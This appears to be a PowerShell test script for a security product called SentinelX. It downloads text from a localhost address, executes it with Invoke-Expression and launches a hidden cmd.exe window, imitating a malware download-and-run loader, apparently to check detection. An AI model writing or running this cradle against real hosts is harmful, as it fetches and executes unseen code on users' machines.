# Benign SentinelX Test Script
Write-Host 'Test Starting'
$client = New-Object Net.WebClient
$data = $client.DownloadString('http://localhost:8080/test_payload')
Invoke-Expression $data
Start-Process cmd.exe -WindowStyle Hidden
